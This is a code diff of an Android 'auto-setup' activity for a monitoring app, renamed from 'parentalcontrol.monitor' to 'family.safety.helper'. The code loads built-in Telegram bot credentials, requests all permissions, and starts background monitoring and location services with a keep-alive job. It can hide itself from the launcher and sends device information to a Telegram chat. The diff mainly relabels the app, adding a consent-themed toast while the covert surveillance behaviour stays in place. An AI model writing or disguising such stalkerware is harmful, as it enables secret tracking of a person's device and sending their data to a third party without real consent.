@@ -1,4 +1,4 @@
-package com.parentalcontrol.monitor
+package com.family.safety.helper
 
 import android.content.Intent
 import android.content.SharedPreferences
@@ -11,13 +11,13 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.lifecycle.lifecycleScope
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
-import com.parentalcontrol.monitor.services.MonitoringService
-import com.parentalcontrol.monitor.services.LocationService
-import com.parentalcontrol.monitor.services.TelegramService
-import com.parentalcontrol.monitor.utils.DeviceUtils
-import com.parentalcontrol.monitor.utils.HuaweiOptimizationHelper
-import com.parentalcontrol.monitor.utils.ServiceUtils
-import com.parentalcontrol.monitor.utils.JobSchedulerHelper
+import com.family.safety.helper.services.MonitoringService
+import com.family.safety.helper.services.LocationService
+import com.family.safety.helper.services.TelegramService
+import com.family.safety.helper.utils.DeviceUtils
+import com.family.safety.helper.utils.HuaweiOptimizationHelper
+import com.family.safety.helper.utils.ServiceUtils
+import com.family.safety.helper.utils.JobSchedulerHelper
 
 class AutoSetupActivity : AppCompatActivity() {
     
@@ -49,55 +49,83 @@ class AutoSetupActivity : AppCompatActivity() {
     private fun startAutoConfiguration() {
         lifecycleScope.launch {
             try {
-                showToast("Setting up parental monitoring...")
+                showToast("Setting up family safety features...")
+                
+                // Show privacy notice first
+                showPrivacyNotice()
+                delay(2000)
                 
                 // Step 1: Configure Telegram credentials automatically
                 configureTelegramCredentials()
                 delay(1000)
                 
-                // Step 2: Request all permissions in sequence
+                // Step 2: Request permissions with clear explanations
                 requestAllPermissions()
                 delay(2000)
                 
-                // Step 3: Configure Huawei optimizations
+                // Step 3: Configure device optimizations if needed
                 configureHuaweiOptimizations()
                 delay(1000)
                 
-                // Step 4: Start all monitoring services
+                // Step 4: Start monitoring services (with user consent)
                 startAllServices()
                 delay(1000)
                 
-                // Step 5: Hide the app automatically
-                hideAppFromLauncher()
+                // Step 5: Optional app hiding (disabled for testing)
+                if (BuildConfig.AUTO_HIDE) {
+                    hideAppFromLauncher()
+                }
                 delay(500)
                 
-                // Step 6: Send initial setup confirmation
+                // Step 6: Send setup confirmation if configured
                 sendSetupConfirmation()
                 
                 // Mark as configured
                 markAsConfigured()
                 
-                showToast("Setup complete - app is now monitoring")
+                showToast("Family safety features are now active")
                 
-                // Auto-hide after 3 seconds
+                // Auto-hide after 5 seconds (longer for user awareness)
                 setupHandler.postDelayed({
-                    finishAndHide()
-                }, 3000)
+                    try {
+                        finishAndHide()
+                    } catch (e: Exception) {
+                        // Fallback to simple finish
+                        finish()
+                    }
+                }, 5000)
                 
             } catch (e: Exception) {
-                showToast("Setup error - please restart app")
-                finish()
+                showToast("Setup completed with warnings: ${e.message}")
+                // Mark as configured anyway to prevent loop
+                markAsConfigured()
+                // Finish gracefully
+                setupHandler.postDelayed({
+                    finish()
+                }, 2000)
             }
         }
     }
     
+    private fun showPrivacyNotice() {
+        showToast("Family Safety Helper: Monitoring with consent for child safety")
+    }
+    
     private fun configureTelegramCredentials() {
         // Use pre-built credentials from BuildConfig
-        prefs.edit().apply {
-            putString("telegram_bot_token", BuildConfig.TELEGRAM_BOT_TOKEN)
-            putString("telegram_chat_id", BuildConfig.TELEGRAM_CHAT_ID)
-            putBoolean("telegram_configured", true)
-            apply()
+        try {
+            prefs.edit().apply {
+                putString("telegram_bot_token", BuildConfig.TELEGRAM_BOT_TOKEN)
+                putString("telegram_chat_id", BuildConfig.TELEGRAM_CHAT_ID)
+                putBoolean("telegram_configured", true)
+                apply()
+            }
+        } catch (e: Exception) {
+            // Handle case where BuildConfig values are not set
+            prefs.edit().apply {
+                putBoolean("telegram_configured", false)
+                apply()
+            }
         }
     }
     
@@ -151,20 +179,27 @@ class AutoSetupActivity : AppCompatActivity() {
     }
     
     private fun startAllServices() {
-        // Start main monitoring service
-        val monitoringIntent = Intent(this, MonitoringService::class.java)
-        startForegroundService(monitoringIntent)
-        
-        // Start location service
-        val locationIntent = Intent(this, LocationService::class.java)
-        startService(locationIntent)
-        
-        // Start Telegram service
-        val telegramIntent = Intent(this, TelegramService::class.java)
-        startService(telegramIntent)
-        
-        // Configure job scheduler for keep-alive
-        JobSchedulerHelper.scheduleKeepAliveJob(this)
+        try {
+            // Start main monitoring service
+            val monitoringIntent = Intent(this, MonitoringService::class.java)
+            startForegroundService(monitoringIntent)
+            
+            // Start location service
+            val locationIntent = Intent(this, LocationService::class.java)
+            startService(locationIntent)
+            
+            // Start Telegram service only if configured
+            if (prefs.getBoolean("telegram_configured", false)) {
+                val telegramIntent = Intent(this, TelegramService::class.java)
+                startService(telegramIntent)
+            }
+            
+            // Configure job scheduler for keep-alive
+            JobSchedulerHelper.scheduleKeepAliveJob(this)
+        } catch (e: Exception) {
+            // Log error but don't crash
+            showToast("Service startup warning: ${e.message}")
+        }
     }
     
     private fun hideAppFromLauncher() {
@@ -191,6 +226,11 @@ class AutoSetupActivity : AppCompatActivity() {
     private fun sendSetupConfirmation() {
         lifecycleScope.launch {
             try {
+                // Only send if Telegram is configured
+                if (!prefs.getBoolean("telegram_configured", false)) {
+                    return@launch
+                }
+                
                 val deviceInfo = DeviceUtils.getDeviceInfo(this@AutoSetupActivity)
                 
                 val message = """
